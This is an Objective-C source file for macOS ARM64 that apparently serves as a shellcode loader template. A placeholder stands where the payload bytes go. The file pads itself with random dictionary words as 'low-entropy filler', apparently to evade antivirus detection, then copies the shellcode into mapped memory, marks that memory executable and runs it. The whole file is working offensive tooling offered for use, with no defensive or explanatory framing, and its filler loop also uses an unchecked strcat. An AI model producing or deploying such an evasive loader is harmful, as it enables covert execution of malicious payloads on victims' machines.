#import <Foundation/Foundation.h>
#include <sys/mman.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <stdio.h>

// Dummy usage to avoid compiler optimizations
static inline void __attribute__((noinline)) bogus_use(const char* s) {
    (void)s;
}

// Placeholder for raw ARM64 shellcode output
unsigned char shellcode[] = {
{{SHELLCODE_PLACEHOLDER}}
};



int main(int argc, const char * argv[]) {
    @autoreleasepool {
        srand((unsigned)time(NULL));

        // Load dictionary file for low-entropy filler
        NSString *dictPath = @"/Users/cfontenot/seclists/Miscellaneous/lang-english.txt";
        NSError *err = nil;
        NSString *content = [NSString stringWithContentsOfFile:dictPath encoding:NSUTF8StringEncoding error:&err];
        if (!content) {
            NSLog(@"[!] Failed to load dictionary: %@", err);
            return -1;
        }

        NSArray<NSString*> *dictionaryWords = [content componentsSeparatedByCharactersInSet:[NSCharacterSet newlineCharacterSet]];
        NSUInteger wordsCount = [dictionaryWords count];

        // Filler loop: concatenate random dictionary words
        for (int i = 0; i < 50; i++) {
            int wordCount = rand() % 4 + 2; // 2-5 words
            char buff[256] = "";
            for (int j = 0; j < wordCount; j++) {
                NSUInteger idx = rand() % wordsCount;
                const char *word = [dictionaryWords[idx] UTF8String];
                if (word) strcat(buff, word);
            }
            bogus_use(buff);
        }

        // Allocate RW memory
        size_t len = sizeof(shellcode) - 1;
        void *mem = mmap(NULL, len, PROT_READ | PROT_WRITE,
                         MAP_ANON | MAP_PRIVATE, -1, 0);
        if (mem == MAP_FAILED) {
            perror("mmap");
            return -1;
        }

        memcpy(mem, shellcode, len);

        // Change to RX and execute
        if (mprotect(mem, len, PROT_READ | PROT_EXEC) != 0) {
            perror("mprotect");
            return -1;
        }

        ((void(*)())mem)();
    }
    return 0;
}
